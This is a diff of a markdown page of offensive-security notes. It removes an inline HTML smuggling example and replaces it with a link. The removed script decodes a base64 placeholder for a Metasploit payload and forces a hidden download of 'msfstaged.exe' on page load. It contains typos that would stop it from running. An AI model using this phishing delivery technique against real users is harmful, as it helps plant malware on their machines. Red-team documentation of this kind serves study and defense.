@@ -17,38 +17,10 @@
 ## HTML Smuggling<a name="Smuggling"></a>
 
 ### JavaScript code to trigger HTML Smuggling
+
 * This technique will download a meterpreter payload once the web page is loaded by the user. (may be blocked by smart screen or other protections)
 
-```
-<html>
-	<body>
-		<script>
-			function base64ToArrayBuffer(base64) {
-				var binary_string = window.atob(base64);
-				var len = binary_string.length;
-				var bytes = new Uint8Arrray(len);
-				for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);}
-				
-				return bytes.buffer;
-			}
-
-			var file ='<OneLiner MfsVenom Payload>'
-			var data = base64ToArrayBuffer(file);
-			var blod = new Blod([data], {type: 'octet/stream'});
-			var fileName = 'msfstaged.exe';
-
-			var a = document.createElement('a');
-			document.body.appendChild(a);
-			a.style = 'display: none';
-			var url = window.URL.createObjectURL(blob);
-			a.href = url;
-			a.download = fileName;
-			a.click();
-			window.URL.revokeObjectURL(url);
-		</script>
-	</body>
-</html>
-```
+Code can be found <a href="/Collections/1.0-Client_Side_Phishing_Attacks/1.1-HTML_Smuggling">here</a>
 
 ## VBA - Phishing<a name="VBAPhishing"></a>
 
